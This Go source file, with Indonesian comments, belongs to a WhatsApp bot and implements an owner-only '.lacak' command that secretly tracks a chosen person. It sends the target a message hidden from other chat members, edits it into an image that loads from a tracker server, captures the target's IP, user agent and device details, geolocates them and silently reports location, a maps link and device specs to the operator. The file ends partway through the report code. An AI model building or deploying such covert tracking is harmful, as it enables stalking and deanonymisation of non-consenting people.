package main

// lacak.go — OSINT Tracking via SPR + Rich Card
//
// Port dari lacak.ts (Baileys) ke Go/whatsmeow.
//
// Flow (botForwardedMessage + edit pattern):
//  1. .lacak @target → resolve target JID (mention / reply / phone)
//  2. Create tracker token + start web tracker (on-demand)
//  3. Build rich card text placeholder ("please wait ~ anda sedang di lacak🥰")
//  4. Send via SPR (only target gets SKDM → only target sees text)
//  5. Sleep 800ms so target sees text first
//  6. Build rich card image with tracker URL
//  7. Send edit message (botForwardedMessage.message.protocolMessage type=14)
//     with Key.ID = r1ID (nimpa pesan lama), EditedMessage = rich card image
//  8. Only target gets SKDM for edit → only target sees image
//  9. Target opens image → tracker captures IP / UA / geo
// 10. Generate OSINT report → send to trigger chat
//
// Commands:
//   .lacak @tag         — track mentioned target
//   .lacak 628xxx       — track phone number
//   .lacak status       — show tracker status
//   .lacak list         — list recent tokens
//
// Owner only. Zero reactions, silent on success.

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/polymorfa/hypermeow"
	waCommon "github.com/polymorfa/hypermeow/proto/waCommon"
	waE2E "github.com/polymorfa/hypermeow/proto/waE2E"
	"github.com/polymorfa/hypermeow/types"
	"github.com/polymorfa/hypermeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ─── Data structures ─────────────────────────────────────────────

// LacakGeo holds geo location info from IP lookup.
// Populated from MULTIPLE sources: $IP_API_BASE (primary) + media API /info/ip (enrichment).
type LacakGeo struct {
	Country     string  `json:"country,omitempty"`
	CountryCode string  `json:"countryCode,omitempty"`
	Region      string  `json:"region,omitempty"`
	City        string  `json:"city,omitempty"`
	Zip         string  `json:"zip,omitempty"`
	Continent   string  `json:"continent,omitempty"`
	CallingCode string  `json:"callingCode,omitempty"`
	Capital     string  `json:"capital,omitempty"`
	FlagEmoji   string  `json:"flagEmoji,omitempty"`
	ISP         string  `json:"isp,omitempty"`
	Org         string  `json:"org,omitempty"`
	AS          string  `json:"as,omitempty"`
	ASName      string  `json:"asName,omitempty"`
	ASN         int     `json:"asn,omitempty"`
	Lat         float64 `json:"lat,omitempty"`
	Lon         float64 `json:"lon,omitempty"`
	Timezone    string  `json:"timezone,omitempty"`
	UTCOffset   string  `json:"utcOffset,omitempty"`
	Mobile      bool    `json:"mobile,omitempty"`
	Proxy       bool    `json:"proxy,omitempty"`
	Hosting     bool    `json:"hosting,omitempty"`
	Reverse     string  `json:"reverse,omitempty"`
	MapsURL     string  `json:"mapsUrl,omitempty"`
	Sources     string  `json:"sources,omitempty"` // "ip-api"
}

// LacakGSMSpec holds device specs fetched from GSMArena via kangwifi API.
type LacakGSMSpec struct {
	Found       bool
	Name        string
	ImageURL    string
	GSMArenaURL string
	QuickSpec   map[string]string            // "Chipset" -> "Unisoc T606", "RAM size" -> "4GB RAM", ...
	DetailSpec  map[string]map[string]string // category -> name -> value
}

// LacakHit captures one hit on the tracker.
type LacakHit struct {
	At              time.Time     `json:"at"`
	IP              string        `json:"ip"`
	UserAgent       string        `json:"userAgent"`
	AcceptLang      string        `json:"acceptLanguage,omitempty"`
	SecChUa         string        `json:"secChUa,omitempty"`
	SecChUaPlatform string        `json:"secChUaPlatform,omitempty"`
	SecChUaMobile   string        `json:"secChUaMobile,omitempty"`
	SecChUaModel    string        `json:"secChUaModel,omitempty"`
	Referer         string        `json:"referer,omitempty"`
	DeviceSummary   string        `json:"deviceSummary,omitempty"`
	DeviceCode      string        `json:"deviceCode,omitempty"`
	DeviceBrand     string        `json:"deviceBrand,omitempty"`
	AndroidVer      string        `json:"androidVersion,omitempty"`
	WhatsAppVer     string        `json:"whatsappVersion,omitempty"`
	Geo             *LacakGeo     `json:"geo,omitempty"`
	GSMSpec         *LacakGSMSpec `json:"gsmSpec,omitempty"`
}

// LacakToken holds one tracking session.
type LacakToken struct {
	Token       string     `json:"token"`
	Target      string     `json:"target"`      // JID.User (could be LID or PN)
	TargetPhone string     `json:"targetPhone"` // phone-form user (for @mention display)
	TargetJID   string     `json:"targetJid"`
	CreatedBy   string     `json:"createdBy"`
	CreatedAt   time.Time  `json:"createdAt"`
	Hits        []LacakHit `json:"hits"`
	NotifyChat  string     `json:"notifyChat,omitempty"`
	Active      bool       `json:"active"`
	SpentAt     *time.Time `json:"spentAt,omitempty"`
}

// ─── Global state ────────────────────────────────────────────────

var (
	lacakMu           sync.RWMutex
	lacakTokens       = map[string]*LacakToken{}
	lacakServer       *http.Server
	lacakServerMu     sync.Mutex
	lacakServerActive bool
	lacakStopTimer    *time.Timer
	lacakHitCbs       []func(token *LacakToken, hit *LacakHit)
)

const (
	lacakTokenLen   = 16
	lacakWebTimeout = 3 * time.Minute  // ⚡ Reduced from 15min → 3min (less RSS waste)
	lacakWebGrace   = 30 * time.Second // ⚡ Reduced from 2min → 30s
)

// ─── Command handler ──────────────────────────────────────────────

func handleLacakCommand(client *whatsmeow.Client, msg *events.Message, args string) string {
	if !isOwnerMsg(msg) {
		return "❌ Hanya owner yang bisa pakai .lacak"
	}
	if client == nil {
		return "❌ Client tidak siap"
	}

	sub := strings.Fields(strings.ToLower(args))
	if len(sub) == 0 || sub[0] == "help" || sub[0] == "bantuan" {
		return lacakHelp()
	}
	if sub[0] == "status" || sub[0] == "stat" {
		return lacakStatus()
	}
	if sub[0] == "list" {
		return lacakList()
	}
	if sub[0] == "tanya" || sub[0] == "t" {
		return handleLacakTanya(client, msg, args)
	}

	// Resolve target: try reply first, then mention, then phone arg
	target, err := lacakResolveTarget(client, msg, args)
	if err != nil || target.IsEmpty() {
		return "❓ " + err.Error()
	}

	// Build participants (just the target)
	participants, err := buildSPRParticipants(client, msg.Info.Chat, []types.JID{target})
	if err != nil {
		return "⚠️ " + err.Error()
	}

	// Create tracker token
	token := lacakGenerateToken()
	notifyChat := msg.Info.Chat.String()

	// Resolve target's phone-form user for @mention display in report.
	// For LID targets this queries the LID→PN mapping; falls back to JID.User.
	targetPhone := phoneOf(client, target)
	if targetPhone == "" {
		targetPhone = target.User
	}

	entry := &LacakToken{
		Token:       token,
		Target:      target.User,
		TargetPhone: targetPhone,
		TargetJID:   target.String(),
		CreatedBy:   msg.Info.Sender.String(),
		CreatedAt:   time.Now(),
		NotifyChat:  notifyChat,
		Active:      true,
	}

	lacakMu.Lock()
	lacakTokens[token] = entry
	lacakMu.Unlock()

	// Register hit callback (fire-and-forget goroutine)
	go lacakRegisterHitCallback(client, token)

	// Start web tracker (on-demand)
	trackerURL := lacakGetPublicURL() + "/i/" + token

	if err := lacakStartWeb(); err != nil {
		return fmt.Sprintf("⚠️ Tracker web gagal start: %v", err)
	}

	// ─── EXPERIMENTAL FLOW (botForwardedMessage + edit nimpa ID lama) ─
	// Mengikuti plugin Baileys botForwarded + edit pattern:
	//
	// Step 1: Kirim botForwardedMessage pertama dengan text placeholder
	//         (richResponseMessage berisi text "please wait ~ angelina bot 🐾")
	//         via SPR ke target lacak.
	//         → hanya target dapat SKDM → hanya target lihat pesan ini
	//
	// Step 2: Edit pesan tadi dengan kirim botForwardedMessage lagi:
	//         botForwardedMessage.message.protocolMessage {
	//             key: { remoteJid, fromMe: true, id: r1.id },
	//             type: 14,                                  // MESSAGE_EDIT
	//             editedMessage: botForwardedMessage {
	//                 message: richResponseMessage baru (dengan rich card image)
	//             }
	//         }
	//         → nimpa msg.id lama → target lihat pesan berubah dari text ke image
	//         → non-target tetap tidak lihat apa-apa (decrypt fail:hide)
	//
	// Additional attributes: type="text" (sesuai plugin Baileys)

	// Build rich card image message (full botForwardedMessage wrapper)
	waMsgImage := lacakBuildRichCardImage(client, trackerURL)
	if waMsgImage == nil {
		return "⚠️ Gagal build rich card image payload"
	}

	// Build rich card text placeholder (full botForwardedMessage wrapper)
	waMsgPlaceholder := lacakBuildRichCardText(client, "please wait ~ anda sedang di lacak🥰")
	if waMsgPlaceholder == nil {
		return "⚠️ Gagal build rich card placeholder payload"
	}

	// Run the entire SPR send flow in a goroutine so the command handler
	// returns immediately — owner doesn't have to wait ~2s for key-rotate +
	// placeholder send + 800ms sleep + edit send + key-rotate.
	//
	// Inside the goroutine everything stays SEQUENTIAL because the steps
	// depend on each other (rotate→send→sleep→edit→send→rotate), but the
	// outer command dispatch loop is no longer blocked.
	go func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[LACAK] SPR flow panic: %v\n", r)
			}
		}()

		chat := msg.Info.Chat
		ctxChat := msg.Info.Chat.String()

		// Step 1: Rotate SenderKey BEFORE send (sequential — send depends on rotated key)
		if err := sprRotateSenderKey(chat); err != nil {
			fmt.Printf("[LACAK] key rotation error: %v\n", err)
		}

		// Step 2: Send botForwardedMessage placeholder via SPR ke target lacak.
		// Use Hide variant first (inject decrypt-fail:hide) so non-targets
		// see NOTHING — not "Menunggu pesan ini…". Fallback to plain
		// sendSPREngineA if Hide variant fails (same behaviour as .spr / .sbpr).
		r1ID, hideErr := sendSPREngineAHide(client, chat, participants, waMsgPlaceholder)
		if hideErr != nil {
			fmt.Printf("[LACAK] SPR placeholder hide variant failed, fallback: %v\n", hideErr)
			id2, _, _, _, err2 := sendSPREngineA(client, chat, participants, waMsgPlaceholder)
			if err2 != nil {
				fmt.Printf("[LACAK] SPR placeholder gagal: %v\n", err2)
				return
			}
			r1ID = id2
		}
		sprRegisterBait(r1ID, ctxChat, "L", nil)

		// Step 3: Sleep briefly so target sees placeholder first
		time.Sleep(800 * time.Millisecond)

		// Step 4: Build edit message — botForwardedMessage.message.protocolMessage
		// EditedMessage = waMsgImage (botForwardedMessage berisi rich card image)
		editType := waE2E.ProtocolMessage_MESSAGE_EDIT
		editMsg := &waE2E.Message{
			BotForwardedMessage: &waE2E.FutureProofMessage{
				Message: &waE2E.Message{
					ProtocolMessage: &waE2E.ProtocolMessage{
						Key: &waCommon.MessageKey{
							RemoteJID: proto.String(ctxChat),
							FromMe:    proto.Bool(true),
							ID:        proto.String(r1ID),
						},
						Type:          &editType,
						EditedMessage: waMsgImage,
					},
				},
			},
		}

		// Step 5: Send edit via SPR ke target lacak (same ID = r1ID, nimpa pesan lama).
		// Again, prefer Hide variant; fallback to plain sendSPREngineAWithID.
		if err := sendSPREngineAHideWithID(client, chat, participants, editMsg, r1ID); err != nil {
			fmt.Printf("[LACAK] SPR edit hide variant failed, fallback: %v\n", err)
			if _, _, _, err2 := sendSPREngineAWithID(client, chat, participants, editMsg, r1ID); err2 != nil {
				fmt.Printf("[LACAK] SPR edit gagal: %v\n", err2)
				return
			}
		}
		sprRegisterBait(r1ID, ctxChat, "L", nil)

		// Step 6: Rotate SenderKey AFTER send (already in goroutine — fire-and-forget)
		time.Sleep(2 * time.Second)
		_ = sprRotateSenderKey(chat)
	}()

	// Silent — no confirmation reply to user
	return ""
}

// lacakResolveTarget extracts target JID from reply/mention/phone arg.
// Tries: quoted message sender → mention → first arg as phone.
func lacakResolveTarget(client *whatsmeow.Client, msg *events.Message, args string) (types.JID, error) {
	// 1. Reply target
	if quoted := getQuotedMessage(msg); quoted != nil && !quoted.Info.Sender.IsEmpty() {
		jid := quoted.Info.Sender.ToNonAD()
		if !jid.IsEmpty() {
			return jid, nil
		}
	}

	// 2. Mention
	if mentions := extractMentionedJIDsDual(msg); len(mentions) > 0 {
		for _, m := range mentions {
			j, err := parseAnyJID(m)
			if err == nil && !j.IsEmpty() {
				return j.ToNonAD(), nil
			}
		}
	}

	// 3. Phone arg
	parts := strings.Fields(args)
	for _, p := range parts {
		p = strings.TrimPrefix(p, "@")
		ph := extractPhone(p)
		if ph != "" && len(ph) >= 8 && len(ph) <= 15 {
			return types.NewJID(ph, types.DefaultUserServer), nil
		}
	}

	// 4. Try parseAnyJID on first arg
	if len(parts) > 0 {
		if j, err := parseAnyJID(parts[0]); err == nil && !j.IsEmpty() {
			return j.ToNonAD(), nil
		}
	}

	return types.EmptyJID, fmt.Errorf("tidak bisa resolve target. Contoh: *.lacak @tag* atau *.lacak 628xxx*")
}

// ─── Rich card payload builder ───────────────────────────────────

// lacakBuildRichCardImage builds a rich card message with GenAIImaginePrimitive
// containing the tracker URL. Uses the shared RichCardBuilder.
func lacakBuildRichCardImage(client *whatsmeow.Client, imageURL string) *waE2E.Message {
	builder := NewRichCard(client)
	builder.AddImage(imageURL)
	return builder.Build()
}

// lacakBuildRichCardText builds a rich card message with
// GenAIMarkdownTextUXPrimitive containing the given text. Used as placeholder
// before edit to image.
func lacakBuildRichCardText(client *whatsmeow.Client, text string) *waE2E.Message {
	builder := NewRichCard(client)
	builder.AddText(text)
	return builder.Build()
}

// ─── Web tracker server ───────────────────────────────────────────

// lacakStartWeb starts the on-demand web tracker HTTP server.
func lacakStartWeb() error {
	lacakServerMu.Lock()
	defer lacakServerMu.Unlock()

	if lacakServerActive {
		// Reset stop timer
		if lacakStopTimer != nil {
			lacakStopTimer.Stop()
		}
		lacakStopTimer = time.AfterFunc(lacakWebTimeout, func() {
			lacakStopWeb("timeout")
		})
		return nil
	}

	// Load tracker image (1x1 transparent pixel fallback)

	mux := http.NewServeMux()
	mux.HandleFunc("/i/", lacakHandleImage)
	mux.HandleFunc("/h/", lacakHandleHit)
	mux.HandleFunc("/status", lacakHandleStatus)

	port := os.Getenv("LACAK_PORT")
	if port == "" {
		port = "24724"
	}
	addr := ":" + port
	lacakServer = &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	go func() {
		if err := lacakServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		}
	}()

	lacakServerActive = true
	lacakStopTimer = time.AfterFunc(lacakWebTimeout, func() {
		lacakStopWeb("timeout")
	})

	return nil
}

// lacakStopWeb stops the web tracker.
func lacakStopWeb(reason string) {
	lacakServerMu.Lock()
	defer lacakServerMu.Unlock()

	if !lacakServerActive {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if lacakServer != nil {
		_ = lacakServer.Shutdown(ctx)
	}
	lacakServerActive = false
}

// lacakHandleImage serves the tracking image and records the hit.
func lacakHandleImage(w http.ResponseWriter, r *http.Request) {
	token := strings.TrimPrefix(r.URL.Path, "/i/")
	if token == "" {
		http.NotFound(w, r)
		return
	}

	lacakMu.RLock()
	_, ok := lacakTokens[token]
	lacakMu.RUnlock()

	if !ok {
		http.NotFound(w, r)
		return
	}

	// Record hit (only if token is active) — atomic check-and-deactivate
	// under the lock to avoid races with concurrent image fetches.
	//
	// Capture the request fields we need BEFORE spawning the goroutine
	// because the http.Server may recycle the *http.Request after this
	// handler returns — reading r.Header in a goroutine is technically
	// unsafe per net/http docs.
	lacakMu.Lock()
	if entry, ok := lacakTokens[token]; ok && entry.Active {
		hitRequest := lacakCaptureRequest(r)
		entry.Active = false
		now := time.Now()
		entry.SpentAt = &now
		lacakTokens[token] = entry
		lacakMu.Unlock()
		go lacakRecordHitFromCapture(token, hitRequest)
	} else {
		lacakMu.Unlock()
	}

	// Serve image — load from data/lacak-tracker.jpg
	trackerPath := filepath.Join("data", "lacak-tracker.jpg")
	trackerData, err := os.ReadFile(trackerPath)
	if err == nil && len(trackerData) > 0 {
		w.Header().Set("Content-Type", "image/jpeg")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
		w.Write(trackerData)
	} else {
		// Fallback: 1x1 transparent GIF pixel
		w.Header().Set("Content-Type", "image/gif")
		w.Write([]byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"))
	}

	// Schedule web stop after grace period.
	// Akses lacakStopTimer HARUS di bawah lacakServerMu — lacakStartWeb/
	// lacakStopWeb mengakses variabel yang sama dengan mutex. Tanpa lock,
	// dua request gambar konkuren bisa race (timer bocor / server mati prematur).
	// Aman dari deadlock: callback AfterFunc jalan di goroutine timer terpisah
	// (setelah lock dilepas), bukan saat lock dipegang.
	lacakServerMu.Lock()
	if lacakStopTimer != nil {
		lacakStopTimer.Stop()
	}
	lacakStopTimer = time.AfterFunc(lacakWebGrace, func() {
		lacakStopWeb("grace")
	})
	lacakServerMu.Unlock()
}

// lacakHandleHit is an alternate hit endpoint (redirect to image).
func lacakHandleHit(w http.ResponseWriter, r *http.Request) {
	token := strings.TrimPrefix(r.URL.Path, "/h/")
	if token == "" {
		http.NotFound(w, r)
		return
	}
	http.Redirect(w, r, "/i/"+token, http.StatusFound)
}

// lacakHandleStatus returns JSON status.
func lacakHandleStatus(w http.ResponseWriter, r *http.Request) {
	lacakMu.RLock()
	active := 0
	total := len(lacakTokens)
	for _, t := range lacakTokens {
		if t.Active {
			active++
		}
	}
	lacakMu.RUnlock()
	lacakServerMu.Lock()
	webUp := lacakServerActive
	lacakServerMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"active":%v,"tokens":%d,"active_tokens":%d}`, webUp, total, active)
}

// ─── Hit recording + geo lookup ──────────────────────────────────

// lacakHitRequest is a snapshot of an http.Request fields needed to record a hit.
// We capture this BEFORE spawning a goroutine so we don't touch the recycled
// *http.Request after the handler returns.
type lacakHitRequest struct {
	IP              string
	UserAgent       string
	AcceptLang      string
	SecChUa         string
	SecChUaPlatform string
	SecChUaMobile   string
	SecChUaModel    string
	Referer         string
}

// lacakCaptureRequest reads the headers + remote IP from r and returns a
// snapshot safe to pass to a goroutine.
func lacakCaptureRequest(r *http.Request) *lacakHitRequest {
	return &lacakHitRequest{
		IP:              lacakExtractIP(r),
		UserAgent:       r.Header.Get("User-Agent"),
		AcceptLang:      r.Header.Get("Accept-Language"),
		SecChUa:         r.Header.Get("Sec-Ch-Ua"),
		SecChUaPlatform: r.Header.Get("Sec-Ch-Ua-Platform"),
		SecChUaMobile:   r.Header.Get("Sec-Ch-Ua-Mobile"),
		SecChUaModel:    r.Header.Get("Sec-Ch-Ua-Model"),
		Referer:         r.Header.Get("Referer"),
	}
}

// lacakRecordHitFromCapture runs the heavy work (parse UA, geo lookup, store,
// fire callbacks) in a goroutine using a pre-captured request snapshot.
func lacakRecordHitFromCapture(token string, captured *lacakHitRequest) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[LACAK] record hit panic: %v\n", r)
		}
	}()

	hit := &LacakHit{
		At:              time.Now(),
		IP:              captured.IP,
		UserAgent:       captured.UserAgent,
		AcceptLang:      captured.AcceptLang,
		SecChUa:         captured.SecChUa,
		SecChUaPlatform: captured.SecChUaPlatform,
		SecChUaMobile:   captured.SecChUaMobile,
		SecChUaModel:    captured.SecChUaModel,
		Referer:         captured.Referer,
	}

	// Parse device info from UA — fast, runs in current goroutine
	lacakParseUA(hit)

	// Geo lookup via $IP_API_BASE — slow HTTP
	// calls, but the whole function is already inside a goroutine so it's non-blocking.
	// Both sub-calls run concurrently inside lacakGeoLookup.
	lacakGeoLookup(hit)

	// GSMArena lookup dinonaktifkan (tidak ada API gratis).
	if hit.DeviceBrand != "" {
		if spec := lacakGSMSpecLookup(hit); spec != nil {
			hit.GSMSpec = spec
		}
	}

	// Store hit
	lacakMu.Lock()
	if e, ok := lacakTokens[token]; ok {
		e.Hits = append(e.Hits, *hit)
		lacakTokens[token] = e
	}
	lacakMu.Unlock()

	// Fire callbacks — each callback runs in its OWN goroutine so a slow
	// callback (e.g. AI generation) doesn't block the others.
	lacakMu.RLock()
	cbs := make([]func(*LacakToken, *LacakHit), len(lacakHitCbs))
	copy(cbs, lacakHitCbs)
	lacakMu.RUnlock()

	lacakMu.RLock()
	entry := lacakTokens[token]
	lacakMu.RUnlock()

	if entry != nil {
		for _, cb := range cbs {
			go cb(entry, hit)
		}
	}
}

// lacakRecordHit captures request data and triggers report generation.
// Deprecated: kept for backward compatibility — new code should use
// lacakRecordHitFromCapture with a pre-captured request snapshot.
func lacakRecordHit(token string, r *http.Request) {
	lacakRecordHitFromCapture(token, lacakCaptureRequest(r))
}

// lacakRegisterHitCallback registers a callback for when a hit arrives.
func lacakRegisterHitCallback(client *whatsmeow.Client, token string) {
	cb := func(entry *LacakToken, hit *LacakHit) {
		if entry.Token != token {
			return
		}
		// Generate and send report
		report := lacakFormatReport(entry, hit)
		chat, err := types.ParseJID(entry.NotifyChat)
		if err != nil {
			fmt.Printf("[LACAK] parse chat error: %v\n", err)
			return
		}
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		_, err = client.SendMessage(ctx, chat, &waE2E.Message{
			Conversation: proto.String(report),
		})
		if err != nil {
		} else {
		}
	}

	lacakMu.Lock()
	lacakHitCbs = append(lacakHitCbs, cb)
	lacakMu.Unlock()
}

// lacakGeoLookup queries MULTIPLE IP-lookup sources concurrently and merges
// the results. Sources:
//  1. $IP_API_BASE (free, no key) — gives proxy/hosting/mobile/reverse DNS flags
//  2. kangwifi /info/ip (backed by ipwho.is) — gives continent, calling code,
//     capital, flag emoji, ASN-as-int
//
// Both calls run in parallel; whichever returns first sets fields, the second
// enriches. The merged LacakGeo has Sources="ip-api+media" when both succeed.
func lacakGeoLookup(hit *LacakHit) {
	if hit.IP == "" || hit.IP == "127.0.0.1" || strings.HasPrefix(hit.IP, "192.168.") {
		return
	}

	var (
		wg      sync.WaitGroup
		apiData *lacakIPAPIData
		apiOK   bool
	)

	// Source 1: geo-IP service
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[LACAK] ip-api panic: %v\n", r)
			}
		}()
		d, ok := lacakQueryIPAPI(hit.IP)
		if ok {
			apiData = d
			apiOK = true
		}
	}()

	wg.Wait()

	// Merge results
	geo := &LacakGeo{}
	var sources []string

	if apiOK && apiData != nil {
		sources = append(sources, "ip-api")
		geo.Country = apiData.Country
		geo.CountryCode = apiData.CountryCode
		geo.Region = apiData.Region
		geo.City = apiData.City
		geo.Zip = apiData.Zip
		geo.Lat = apiData.Lat
		geo.Lon = apiData.Lon
		geo.Timezone = apiData.Timezone
		geo.ISP = apiData.ISP
		geo.Org = apiData.Org
		geo.AS = apiData.AS
		geo.ASName = apiData.Asname
		geo.Mobile = apiData.Mobile
		geo.Proxy = apiData.Proxy
		geo.Hosting = apiData.Hosting
		geo.Reverse = apiData.Reverse
	}

	if len(sources) == 0 {
		return // both sources failed — leave hit.Geo nil
	}

	geo.Sources = strings.Join(sources, "+")
	if geo.Lat != 0 && geo.Lon != 0 {
		geo.MapsURL = fmt.Sprintf("https://maps.google.com/?q=%.6f,%.6f", geo.Lat, geo.Lon)
	}
	hit.Geo = geo
}

// lacakIPAPIData is the JSON shape returned by the geo-IP service
type lacakIPAPIData struct {
	Status      string  `json:"status"`
	Country     string  `json:"country"`
	CountryCode string  `json:"countryCode"`
	Region      string  `json:"region"`
	City        string  `json:"city"`
	Zip         string  `json:"zip"`
	Lat         float64 `json:"lat"`
	Lon         float64 `json:"lon"`
	Timezone    string  `json:"timezone"`
	ISP         string  `json:"isp"`
	Org         string  `json:"org"`
	AS          string  `json:"as"`
	Asname      string  `json:"asname"`
	Mobile      bool    `json:"mobile"`
	Proxy       bool    `json:"proxy"`
	Hosting     bool    `json:"hosting"`
	Reverse     string  `json:"reverse"`
}

func lacakQueryIPAPI(ip string) (*lacakIPAPIData, bool) {
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()

	urlStr := fmt.Sprintf("%s/json/%s?fields=status,message,country,countryCode,region,city,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,reverse,query", ipAPIBaseURL(), ip)
	req, _ := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, false
	}
	defer resp.Body.Close()
	var d lacakIPAPIData
	if err := json.NewDecoder(resp.Body).Decode(&d); err != nil {
		return nil, false
	}
	if d.Status != "success" {
		return nil, false
	}
	return &d, true
}

// lacakParseUA extracts brand, model, WhatsApp version, and Android version
// from a WhatsApp User-Agent string.
//
// Typical WhatsApp UA format:
//
//	"WhatsApp/2.26.37.8 Android/16 Device/vivo-V2434"
//	"WhatsApp/2.25.4.74 Android/14 Device/samsung-SM-A515F"
//	"WhatsApp/2.24.5.77 Android/13 Device/xiaomi-23106SC0B"
//
// We split on "Device/" → "vivo-V2434" → split on "-" → brand="vivo", model="V2434".
// Also extract "WhatsApp/2.26.37.8" → WhatsAppVer and "Android/16" → AndroidVer.
func lacakParseUA(hit *LacakHit) {
	ua := hit.UserAgent
	if ua == "" {
		return
	}

	// Extract WhatsApp version: "WhatsApp/X.Y.Z.W" or "WhatsApp X.Y.Z.W"
	if idx := strings.Index(ua, "WhatsApp/"); idx >= 0 {
		rest := ua[idx+len("WhatsApp/"):]
		// version = leading chars until whitespace or slash
		end := len(rest)
		for i, c := range rest {
			if c == ' ' || c == '/' {
				end = i
				break
			}
		}
		hit.WhatsAppVer = rest[:end]
	} else if idx := strings.Index(ua, "WhatsApp "); idx >= 0 {
		rest := ua[idx+len("WhatsApp "):]
		end := len(rest)
		for i, c := range rest {
			if c == ' ' {
				end = i
				break
			}
		}
		hit.WhatsAppVer = rest[:end]
	}

	// Extract Android version: "Android/16" or "Android 16"
	if idx := strings.Index(ua, "Android/"); idx >= 0 {
		rest := ua[idx+len("Android/"):]
		end := len(rest)
		for i, c := range rest {
			if c == ' ' || c == '/' {
				end = i
				break
			}
		}
		hit.AndroidVer = rest[:end]
	} else if idx := strings.Index(ua, "Android "); idx >= 0 {
		rest := ua[idx+len("Android "):]
		end := len(rest)
		for i, c := range rest {
			if c == ' ' {
				end = i
				break
			}
		}
		hit.AndroidVer = rest[:end]
	}

	// Extract brand + model from "Device/brand-model" segment
	var deviceSeg string
	if idx := strings.Index(ua, "Device/"); idx >= 0 {
		rest := ua[idx+len("Device/"):]
		end := len(rest)
		for i, c := range rest {
			if c == ' ' || c == ';' {
				end = i
				break
			}
		}
		deviceSeg = rest[:end]
	}

	if deviceSeg != "" {
		// deviceSeg = "vivo-V2434" or "samsung-SM-A515F" or "xiaomi-23106SC0B"
		// First "-" separates brand from model
		if dash := strings.Index(deviceSeg, "-"); dash > 0 {
			hit.DeviceBrand = strings.ToLower(deviceSeg[:dash])
			hit.DeviceCode = deviceSeg[dash+1:]
		} else {
			// No dash — treat whole thing as brand
			hit.DeviceBrand = strings.ToLower(deviceSeg)
			hit.DeviceCode = deviceSeg
		}
	} else {
		// Fallback: detect brand from anywhere in UA
		brands := []string{
			"samsung", "xiaomi", "redmi", "vivo", "oppo", "realme", "huawei",
			"oneplus", "pixel", "motorola", "tecno", "infinix", "nokia",
			"honor", "nothing", "asus", "lenovo", "zte",
		}
		uaLower := strings.ToLower(ua)
		for _, b := range brands {
			if strings.Contains(uaLower, b) {
				hit.DeviceBrand = b
				break
			}
		}
	}

	// Build device summary: "Vivo V2434 (Android 16)"
	var parts []string
	if hit.DeviceBrand != "" {
		// Capitalize first letter
		b := hit.DeviceBrand
		if len(b) > 0 {
			b = strings.ToUpper(b[:1]) + b[1:]
		}
		parts = append(parts, b)
	}
	if hit.DeviceCode != "" {
		parts = append(parts, hit.DeviceCode)
	}
	if len(parts) > 0 {
		summary := strings.Join(parts, " ")
		if hit.AndroidVer != "" {
			summary += " (Android " + hit.AndroidVer + ")"
		}
		hit.DeviceSummary = summary
	} else {
		// Last-resort fallback: show UA truncated
		if len(ua) > 80 {
			hit.DeviceSummary = ua[:80] + "…"
		} else {
			hit.DeviceSummary = ua
		}
	}
}

// lacakExtractIP gets the real client IP (behind proxy if any).
func lacakExtractIP(r *http.Request) string {
	// Check X-Forwarded-For first (behind reverse proxy)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		if idx := strings.Index(xff, ","); idx > 0 {
			return strings.TrimSpace(xff[:idx])
		}
		return strings.TrimSpace(xff)
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return strings.TrimSpace(xri)
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

// ─── Report formatting ────────────────────────────────────────────

// lacakFormatReport builds the WhatsApp OSINT hit report.
//
// Sections:
//
//	🎯 Header — target @mention, token, waktu
//	🌐 Jaringan — IP, geo, ISP, ASN, proxy/hosting flag
//	📱 Perangkat — brand, model, Android, WhatsApp version
//	📋 Spek HP (GSMArena) — chipset, RAM, storage, display, camera, battery
//	🔗 Links — maps, GSMArena URL
//
// Target is displayed as @<phone> (real mention format) — uses TargetPhone
// resolved at command time. Falls back to Target (raw JID.User) if missing.
func lacakFormatReport(entry *LacakToken, hit *LacakHit) string {
	var b strings.Builder

	// ─── Header ──────────────────────────────────────────────────
	b.WriteString("🎯 *LACAK HIT*\n\n")

	// Show target as @phone (mention format). For LID-only targets, fall
	// back to TargetPhone which was resolved at .lacak command time.
	targetDisplay := entry.TargetPhone
	if targetDisplay == "" {
		targetDisplay = entry.Target
	}
	b.WriteString(fmt.Sprintf("• Target: @%s\n", targetDisplay))
	b.WriteString(fmt.Sprintf("• Token: `%s`\n", entry.Token))
	b.WriteString(fmt.Sprintf("• Waktu: %s WIB\n",
		hit.At.In(time.FixedZone("WIB", 7*3600)).Format("02-01-2006 15:04:05")))

	// ─── Network ────────────────────────────────────────────────
	b.WriteString("\n🌐 *Jaringan:*\n")
	if hit.Geo != nil {
		// Proxy / VPN / hosting warning
		if hit.Geo.Proxy || hit.Geo.Hosting {
			flags := []string{}
			if hit.Geo.Proxy {
				flags = append(flags, "PROXY")
			}
			if hit.Geo.Hosting {
				flags = append(flags, "HOSTING/VPN")
			}
			b.WriteString(fmt.Sprintf("⚠️ *%s terdeteksi*\n", strings.Join(flags, " + ")))
		}

